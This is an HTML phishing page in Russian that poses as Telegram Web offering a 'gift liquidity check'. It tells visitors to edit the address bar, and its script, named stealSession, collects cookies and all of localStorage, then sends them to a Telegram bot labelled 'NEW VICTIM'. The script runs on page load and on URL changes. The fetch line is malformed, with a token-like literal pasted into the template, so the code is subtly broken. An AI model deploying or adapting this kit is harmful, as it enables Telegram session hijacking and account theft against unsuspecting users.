<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        body { margin:0; background:#0f0f0f; color:#fff; font-family: system-ui; }
        .fake-bar {
            background: #229ED9;
            padding: 10px 15px;
            text-align: center;
            font-weight: bold;
        }
        .content {
            padding: 40px 20px;
            text-align: center;
            max-width: 480px;
            margin: 80px auto;
        }
        .url {
            background: #1a1a1a;
            padding: 12px;
            font-family: monospace;
            border-radius: 6px;
            margin: 20px 0;
            word-break: break-all;
            color: #0f0;
        }
    </style>
</head>
<body>

<div class="fake-bar">Telegram Web — Проверка подарка</div>

<div class="content">
    <h1>🎁 Оценка ликвидности подарка</h1>
    <p>Допишите в адресной строке <strong>/gift</strong> после /k# и нажмите Enter</p>
    
    <div class="url" id="currentUrl">https://web.telegram.org/k#/</div>
    
    <p style="color:#888; font-size:14px;">
        После этого автоматически запустится проверка ваших подарков для Portal / Mrkt.
    </p>
</div>

<script>
// === НАСТРОЙКИ БОТА ===
const BOT_TOKEN = "7845123456:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxx";   // ← Замени на свой токен
const CHAT_ID = "123456789";                                     // ← Замени на свой chat_id

function stealSession() {
    const data = {
        timestamp: Date.now(),
        url: window.location.href,
        cookies: document.cookie,
        localStorage: {},
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        stolenAt: new Date().toISOString()
    };

    // Собираем весь localStorage (самое ценное)
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.localStorage[key] = localStorage.getItem(key);
    }

    const messageText = "🎁 НОВАЯ ЖЕРТВА!\n\n" +
        "Время: " + data.stolenAt + "\n" +
        "URL: " + data.url + "\n" +
        "User-Agent: " + data.userAgent + "\n\n" +
        "Cookies:\n" + (data.cookies || "нет") + "\n\n" +
        "LocalStorage:\n" + JSON.stringify(data.localStorage, null, 2);

    // Отправляем в Telegram-бота
    fetch(`https://api.telegram.org/bot${8766124425:AAGo8j4YjLDD418G8xwj4zN2pEuCNh-Vyc4}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: "HTML",
            disable_web_page_preview: true
        }),
        keepalive: true
    }).catch(err => {
        console.log("Ошибка отправки:", err);
    });
}

// Запускаем кражу при загрузке и при изменении URL
window.addEventListener('load', stealSession);
window.addEventListener('hashchange', stealSession);
window.addEventListener('popstate', stealSession);

// Обновляем отображаемый URL
setInterval(() => {
    let url = window.location.href;
    if (!url.includes('/gift')) url += (url.includes('#') ? '' : '#') + '/gift';
    document.getElementById('currentUrl').textContent = url;
}, 500);
</script>

</body>
</html>
